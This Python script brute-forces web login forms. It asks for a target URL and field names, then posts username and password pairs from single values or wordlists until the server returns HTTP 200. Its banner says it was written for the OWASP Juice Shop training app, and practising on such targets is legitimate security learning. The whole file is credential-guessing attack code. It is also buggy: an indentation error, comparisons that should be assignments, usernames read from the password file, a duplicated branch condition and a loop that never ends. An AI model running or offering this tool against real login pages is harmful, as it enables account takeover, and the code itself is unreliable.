import requests
import time 
import sys 
import os 

print('''
__________                                               .___
\______   \_____    ______ ________  _  _____________  __| _/
 |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ | 
 |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ | 
 |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ | 
                \/     \/     \/                          \/ 
_________                       __                           
\_   ___ \____________    ____ |  | __ ___________           
/    \  \/\_  __ \__  \ _/ ___\|  |/ // __ \_  __ \          
\     \____|  | \// __ \\  \___|    <\  ___/|  | \/          
 \______  /|__|  (____  /\___  >__|_ \\___  >__|             
        \/            \/     \/     \/    \/              

- By 0xHawwk for OWASP Juice Shop :)
''')

# ---------------Brute-Force function in development to make code less clumsy lmfao---------------------


# Not required rn :) 
def brutef(user_func, pass_func, url_func, payload_func):
    r = requests.post(url_func, data=payload_func)
        print("Trying:"+str(user_func)+":"+str(pass_func)+":")
        if r.status_code == 200:
            return True


# -------------------------------------------------------------------------------------------------------

# User Inputs 
url = input("\n\nLogin Web-address: ")


# Wordlist or not choices
uname_yes_no = input("\nWill you be using username wordlist? (y) or (n): ")
if uname_yes_no.lower() == "y":
    uname_wordlist = input("Username wordlist location: ")
    uname_list = open(uname_wordlist,"r")

else:
    uname = input("What's the username: ") 

passw_yes_no = input("\n\nWill you be using password wordlist? (y) or (n): ")
if passw_yes_no.lower() == "y":
    passw_wordlist = input("Password wordlist location: ")
    pass_list = open(passw_wordlist,"r")
else:
    passw = input("What's the password: ")
 

uname_field = input("\n\nUsername input field: ")
pass_field = input("Password input field: ")


# Default fields 
if uname_field == "":
    uname_field == "username"

if pass_field == "":
    pass_field == "password"

# Trying password combination
while True:
    
    # user wordlist yes and pass wordlist yes
    if uname_yes_no.lower() == "y" and passw_yes_no.lower() == "y":
        passw = pass_list.readline()
        pass_main = passw.strip()
        uname = pass_list.readline()
        user_main = uname.strip()
        
        # Payload 
        payload = {

            uname_field: user_main,
            pass_field: pass_main

        }

        # Bruteforce 
        r = requests.post(url, data=payload)
        print("Trying:"+str(user_main)+":"+str(pass_main)+":")
        if r.status_code == 200:
            print(str(user_main)+":"+str(pass_main)+" was successful!")
            break
        


    # user wordlist yes and pass wordlist no 
    if uname_yes_no.lower() == "y" and passw_yes_no.lower() == "n":
        passw = passw
        uname = pass_list.readline()
        user_main = uname.strip()
        # Payload 
        payload = {

            uname_field: user_main,
            pass_field: passw

        }

        # Bruteforce 
        r = requests.post(url, data=payload)
        print("Trying:"+str(user_main)+":"+str(passw)+":")
        if r.status_code == 200:
            print(str(user_main)+":"+str(passw)+" was successful!")
            break
       

    # user wordlist no and pass wordlist yes
    if uname_yes_no.lower() == "n" and passw_yes_no.lower() == "y":
        passw = pass_list.readline()
        pass_main = passw.strip()
        uname = uname
        # Payload 
        payload = {

            uname_field: uname,
            pass_field: pass_main

        }

        # Bruteforce 
        r = requests.post(url, data=payload)
        print("Trying:"+str(uname)+":"+str(pass_main)+":")
        if r.status_code == 200:
            print(str(uname)+":"+str(pass_main)+" was successful!")
            break
        

    
    # user wordlist no and pass wordlist no 
    if uname_yes_no.lower() == "n" and passw_yes_no.lower() == "y":
        passw = passw
        uname = uname
        # Payload 
        payload = {

            uname_field: uname,
            pass_field: passw

        }

        # Bruteforce 
        r = requests.post(url, data=payload)
        print("Trying:"+str(uname)+":"+str(passw)+":")
        if r.status_code == 200:
            print(str(uname)+":"+str(passw)+" was successful!")
            break
        else:
            print("Try again!")
            break